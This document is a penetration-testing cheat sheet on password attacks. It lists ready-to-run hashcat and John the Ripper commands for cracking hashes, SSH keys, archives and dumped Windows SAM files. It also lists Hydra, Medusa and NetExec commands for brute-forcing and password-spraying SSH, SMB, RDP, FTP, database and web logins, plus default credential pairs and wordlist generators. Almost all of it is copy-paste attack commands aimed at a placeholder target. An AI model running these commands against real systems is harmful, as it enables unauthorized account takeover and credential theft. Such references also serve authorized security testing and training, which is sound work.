# Password Attacks

## Hash-Cracking


## Identify Hash Type

```bash
hashid 'HASH_HERE'
hash-identifier
```

## Hashcat - Common Hash Types

```bash
# MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA512
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# NTLMv2
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberos TGS-REP (Kerberoasting)
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberos AS-REP
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## Hashcat - Attack Modes

```bash
# Dictionary attack (-a 0)
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt

# Combination attack (-a 1)
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Mask attack (-a 3) - Brute force
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # 6 characters, all printable
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d  # Uppercase + 3 lowercase + 3 digits

# Hybrid attack (-a 6) - Dictionary + Mask
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d  # Append 3 digits

# Hybrid attack (-a 7) - Mask + Dictionary
hashcat -m 0 -a 7 hash.txt ?d?d?d wordlist.txt  # Prepend 3 digits
```

## Hashcat - Useful Options

```bash
# Show cracked passwords
hashcat -m 1000 hash.txt --show

# Use rules
hashcat -m 1000 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Performance
hashcat -m 1000 -a 0 hash.txt wordlist.txt --force  # Force CPU/GPU
hashcat -m 1000 -a 0 hash.txt wordlist.txt -O  # Optimized kernel
hashcat -m 1000 -a 0 hash.txt wordlist.txt -w 3  # Workload profile (1-4)
```

## Hashcat - Character Sets

```
?l = lowercase (a-z)
?u = uppercase (A-Z)
?d = digits (0-9)
?s = special characters
?a = all printable ASCII
?b = all possible bytes (0x00-0xff)
```

## John the Ripper

```bash
# Automatic mode
john hash.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Use rules
john --wordlist=wordlist.txt --rules hash.txt

# Specific format
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Crack SSH private key
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Crack ZIP files
zip2john file.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

# Crack RAR files
rar2john file.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash

# Crack Windows SAM
samdump2 SYSTEM SAM > sam.hash
john --wordlist=/usr/share/wordlists/rockyou.txt sam.hash

# Incremental mode (brute force)
john --incremental hash.txt
```

## Hashcat Rules

```bash
# Use best64 rule
hashcat -a 0 -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Other useful rules
/usr/share/hashcat/rules/leetspeak.rule
/usr/share/hashcat/rules/rockyou-30000.rule
/usr/share/hashcat/rules/dive.rule
```

## Bruteforce


## Hydra

### SSH
```bash
# Single user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# User list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# Specific port
hydra -l admin -P passwords.txt ssh://TARGET:2222
```

### FTP
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET
hydra -L users.txt -P passwords.txt ftp://TARGET
```

### SMB
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://TARGET
hydra -L users.txt -P passwords.txt smb://TARGET
```

### HTTP POST Form
```bash
# Capture POST request first to identify parameters
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# With cookie
hydra -l admin -P passwords.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:H=Cookie\: PHPSESSID=abc:F=failed"
```

### HTTP Basic Auth
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-get /admin
```

### MySQL
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET
```

### RDP
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET
```

### VNC
```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://TARGET
```

### Common Options
```bash
-t 4        # Number of parallel tasks (default 16)
-V          # Verbose mode
-f          # Exit after first valid password
-s PORT     # Custom port
-o output.txt  # Save results
```

---

## Medusa

```bash
# SSH
medusa -h TARGET -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# FTP
medusa -h TARGET -u admin -P passwords.txt -M ftp

# SMB
medusa -h TARGET -u administrator -P passwords.txt -M smbnt

# MySQL
medusa -h TARGET -u root -P passwords.txt -M mysql

# Options
-t 10       # Number of parallel threads
-f          # Stop after first valid password
-O output.txt  # Save results
```

---

## NetExec (CrackMapExec)

```bash
# SMB brute force
netexec smb TARGET -u admin -p passwords.txt

# Check for null sessions
netexec smb TARGET -u '' -p ''

# WinRM
netexec winrm TARGET -u admin -p password

# MSSQL
netexec mssql TARGET -u sa -p password
```

## Password-Spray


## NetExec Password Spray

```bash
# Single password against user list
netexec smb TARGET -u users.txt -p 'Password123' --continue-on-success

# Password spray with domain
netexec smb TARGET -u users.txt -p 'Password123' -d DOMAIN --continue-on-success
```

## Common Password Patterns

```
Company_name + Year (Company2024)
Season + Year (Winter2024)
Month + Year (January2024)
Welcome + Number (Welcome123)
Password + Special (Password!)
```

## Default Credentials

```
admin:admin
admin:password
administrator:password
root:root
root:toor
admin:admin123
guest:guest
user:user
sa:sa (MSSQL)
postgres:postgres
```

## Resources

- https://github.com/ihebski/DefaultCreds-cheat-sheet
- https://cirt.net/passwords
- Router/device manufacturer documentation

## Wordlists


## Crunch

```bash
# Generate 4-6 character wordlist (lowercase)
crunch 4 6 -o wordlist.txt

# With custom charset
crunch 6 8 0123456789abcdef -o wordlist.txt

# Pattern-based
crunch 8 8 -t pass@@@@ -o wordlist.txt  # pass + 4 digits

# Symbols:
# @ = lowercase
# , = uppercase
# % = numbers
# ^ = symbols
```

## Cewl

```bash
# Spider website for words
cewl http://TARGET -w wordlist.txt

# Minimum word length
cewl http://TARGET -m 6 -w wordlist.txt

# Include emails
cewl http://TARGET -e -w wordlist.txt

# Depth of spidering
cewl http://TARGET -d 3 -w wordlist.txt
```

## Username Anarchy

```bash
# Generate username variations
./username-anarchy John Smith > usernames.txt

# Common formats:
# john.smith
# johnsmith
# jsmith
# smithj
# john_smith
```

## Common Wordlists

```bash
# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# Usernames
/usr/share/seclists/Usernames/Names/names.txt
```

